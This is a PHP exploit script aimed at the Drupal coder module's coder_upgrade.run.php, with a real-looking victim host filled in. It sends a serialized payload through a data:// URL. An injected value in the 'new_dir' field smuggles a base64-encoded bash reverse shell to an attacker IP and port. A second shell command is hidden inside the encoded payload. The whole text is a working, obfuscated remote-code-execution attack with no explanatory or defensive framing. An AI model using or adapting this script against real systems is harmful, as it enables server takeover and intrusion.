<?php

$rev_host = "10.0.0.43";	// attacker's ip
$rev_port = "8000";			// attacker's port

$target_host = "test.visc.vn";	// victim's ip
$target_port = "80";		// victim' port
$targeturi = "/";	// URI

$reverse_shell = base64_encode("bash -i >& /dev/tcp/${rev_host}/${rev_port} 0>&1");

$payload = unserialize(base64_decode("YTo2OntzOjU6InBhdGhzIjthOjM6e3M6MTI6Im1vZHVsZXNfYmFzZSI7czo4OiIuLi8uLi8uLiI7czoxMDoiZmlsZXNfYmFzZSI7czo1OiIuLi8uLiI7czoxNDoibGlicmFyaWVzX2Jhc2UiO3M6NToiLi4vLi4iO31zOjExOiJ0aGVtZV9jYWNoZSI7czoxNjoidGhlbWVfY2FjaGVfdGVzdCI7czo5OiJ2YXJpYWJsZXMiO3M6MTQ6InZhcmlhYmxlc190ZXN0IjtzOjg6InVwZ3JhZGVzIjthOjE6e2k6MDthOjI6e3M6NDoicGF0aCI7czoyOiIuLiI7czo2OiJtb2R1bGUiO3M6MzoiZm9vIjt9fXM6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czozOiJwaHAiO3M6MzoicGhwIjt9czo1OiJpdGVtcyI7YToxOntpOjA7YTozOntzOjc6Im9sZF9kaXIiO3M6MTI6Ii4uLy4uL2ltYWdlcyI7czo3OiJuZXdfZGlyIjtzOjk5OiItdjtwZXJsIC1lICdzeXN0ZW0ocGFjayhxcSxINTgsLHFxLDZlNjMyMDMxMzAyZTMwMmUzMDJlMzEzNDIwMzQzNDM0MzYyMDJkNjUyMDJmNjI2OTZlMmY3MzY4MjAsKSknICMiO3M6NDoibmFtZSI7czo0OiJ0ZXN0Ijt9fX0="));

$payload["items"][0]["new_dir"] = "-v; echo $reverse_shell | base64 -d | bash #";


file_get_contents("http://${target_host}:${target_port}${targeturi}sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?file=data://text/plain;base64," . base64_encode(serialize($payload)));

?>